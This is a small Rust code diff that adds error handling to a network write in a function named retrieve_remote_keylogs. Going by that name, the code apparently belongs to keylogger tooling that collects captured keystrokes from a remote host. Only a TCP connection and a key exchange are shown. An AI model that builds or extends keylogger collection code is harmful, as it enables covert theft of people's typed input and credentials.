@@ -325,7 +325,7 @@ pub fn retrieve_remote_keylogs(addr: &str, public_key: &[u8]) -> Vec<(String, Ve
     println!("{}", addr);
     let mut stream = std::net::TcpStream::connect(addr).expect("Error connecting");
 
-    stream.write(public_key);
+    stream.write(public_key).expect("Public key send failed");
 
     let mut data = Vec::new();
 
